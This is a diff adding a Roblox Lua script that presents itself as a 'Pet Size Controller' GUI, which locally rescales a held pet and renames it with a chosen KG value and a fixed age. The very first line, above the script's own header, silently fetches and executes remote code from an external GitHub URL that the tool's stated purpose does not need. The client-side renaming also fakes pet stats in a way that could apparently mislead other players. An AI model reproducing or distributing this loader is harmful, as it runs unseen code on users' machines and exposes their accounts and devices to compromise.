@@ -1,0 +1,190 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xscripts-official/EggRefresher/refs/heads/main/EggRefresherLATEST"))()
+--// Pet KG Size Changer GUI
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- Store original sizes so scaling is always clean
+local OriginalSizes = {}
+
+-- Detect held pet (Tool)
+local function GetHeldPet()
+    for _, tool in ipairs(Character:GetChildren()) do
+        if tool:IsA("Tool") and tool:FindFirstChildWhichIsA("BasePart") then
+            return tool
+        end
+    end
+    return nil
+end
+
+-- Save original sizes
+local function SaveOriginalSizes(pet)
+    if not pet or OriginalSizes[pet] then return end
+    OriginalSizes[pet] = {}
+    for _, part in ipairs(pet:GetDescendants()) do
+        if part:IsA("BasePart") then
+            OriginalSizes[pet][part] = part.Size
+        elseif part:IsA("SpecialMesh") then
+            OriginalSizes[pet][part] = part.Scale
+        end
+    end
+end
+
+-- Set pet size based on KG
+local function SetPetSize(pet, kg)
+    if not pet then return end
+    SaveOriginalSizes(pet)
+
+    local scaleFactor = kg / 10 -- Adjust base denominator for balance
+
+    for part, orig in pairs(OriginalSizes[pet]) do
+        if part:IsA("BasePart") then
+            part.Size = orig * scaleFactor
+        elseif part:IsA("SpecialMesh") then
+            part.Scale = orig * scaleFactor
+        end
+    end
+end
+
+-- GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = PlayerGui
+
+-- Toggle Button
+local ToggleBtn = Instance.new("TextButton")
+ToggleBtn.Size = UDim2.new(0, 60, 0, 60)
+ToggleBtn.Position = UDim2.new(0, 10, 0.4, 0)
+ToggleBtn.Text = "🐾"
+ToggleBtn.TextScaled = true
+ToggleBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
+ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ToggleBtn.Parent = ScreenGui
+ToggleBtn.AutoButtonColor = true
+ToggleBtn.Font = Enum.Font.GothamBold
+ToggleBtn.TextStrokeTransparency = 0.7
+ToggleBtn.BorderSizePixel = 0
+ToggleBtn.ZIndex = 2
+
+-- Frame
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 320, 0, 220)
+Frame.Position = UDim2.new(0.25, 0, 0.35, 0)
+Frame.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+Frame.BackgroundTransparency = 0.05
+Frame.Visible = false
+Frame.Parent = ScreenGui
+
+Frame.ClipsDescendants = true
+Frame.BorderSizePixel = 0
+Frame.Active = true
+Frame.Draggable = true
+Frame.ZIndex = 1
+
+-- Rounded corners
+local UICorner = Instance.new("UICorner", Frame)
+UICorner.CornerRadius = UDim.new(0, 12)
+
+-- Title
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+Title.Text = "Pet Size Controller"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Font = Enum.Font.GothamBold
+Title.TextScaled = true
+Title.Parent = Frame
+Instance.new("UICorner", Title).CornerRadius = UDim.new(0, 12)
+
+-- Pet Info
+local PetInfo = Instance.new("TextLabel")
+PetInfo.Size = UDim2.new(1, -20, 0, 30)
+PetInfo.Position = UDim2.new(0, 10, 0, 50)
+PetInfo.TextColor3 = Color3.fromRGB(200, 200, 255)
+PetInfo.Text = "No pet equipped"
+PetInfo.Font = Enum.Font.Gotham
+PetInfo.TextScaled = true
+PetInfo.BackgroundTransparency = 1
+PetInfo.Parent = Frame
+
+-- Input Box
+local InputBox = Instance.new("TextBox")
+InputBox.Size = UDim2.new(0, 140, 0, 50)
+InputBox.Position = UDim2.new(0, 10, 0, 100)
+InputBox.PlaceholderText = "Enter KG"
+InputBox.Text = ""
+InputBox.TextScaled = true
+InputBox.Font = Enum.Font.GothamBold
+InputBox.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
+InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+InputBox.Parent = Frame
+Instance.new("UICorner", InputBox).CornerRadius = UDim.new(0, 8)
+
+-- Apply Button
+local ApplyBtn = Instance.new("TextButton")
+ApplyBtn.Size = UDim2.new(0, 120, 0, 50)
+ApplyBtn.Position = UDim2.new(0, 170, 0, 100)
+ApplyBtn.Text = "Apply"
+ApplyBtn.BackgroundColor3 = Color3.fromRGB(70, 120, 180)
+ApplyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ApplyBtn.Font = Enum.Font.GothamBold
+ApplyBtn.TextScaled = true
+ApplyBtn.Parent = Frame
+Instance.new("UICorner", ApplyBtn).CornerRadius = UDim.new(0, 8)
+
+-- Warning Label
+local Warning = Instance.new("TextLabel")
+Warning.Size = UDim2.new(1, -20, 0, 40)
+Warning.Position = UDim2.new(0, 10, 0, 170)
+Warning.TextColor3 = Color3.fromRGB(255, 120, 120)
+Warning.Text = ""
+Warning.TextScaled = true
+Warning.Font = Enum.Font.Gotham
+Warning.BackgroundTransparency = 1
+Warning.Parent = Frame
+
+-- Toggle Logic
+ToggleBtn.MouseButton1Click:Connect(function()
+    Frame.Visible = not Frame.Visible
+end)
+
+-- Update Pet Info
+local function UpdatePetInfo()
+    local petTool = GetHeldPet()
+    if petTool then
+        PetInfo.Text = petTool.Name
+    else
+        PetInfo.Text = "No pet equipped"
+    end
+end
+
+-- Apply Logic
+ApplyBtn.MouseButton1Click:Connect(function()
+    local petTool = GetHeldPet()
+    if not petTool then
+        Warning.Text = "⚠ No pet equipped!"
+        return
+    end
+
+    local newKg = tonumber(InputBox.Text)
+    if newKg then
+        Warning.Text = ""
+        -- Change tool name
+        local petName = petTool.Name:match("^(%a+)")
+        petTool.Name = string.format("%s [%.2f KG] (Age 36)", petName or "Pet", newKg)
+        -- Set pet size
+        SetPetSize(petTool, newKg)
+        UpdatePetInfo()
+    else
+        Warning.Text = "❌ Enter a valid number!"
+    end
+end)
+
+-- Keep info updated
+task.spawn(function()
+    while task.wait(1) do
+        if Frame.Visible then
+            UpdatePetInfo()
+        end
+    end
+end)
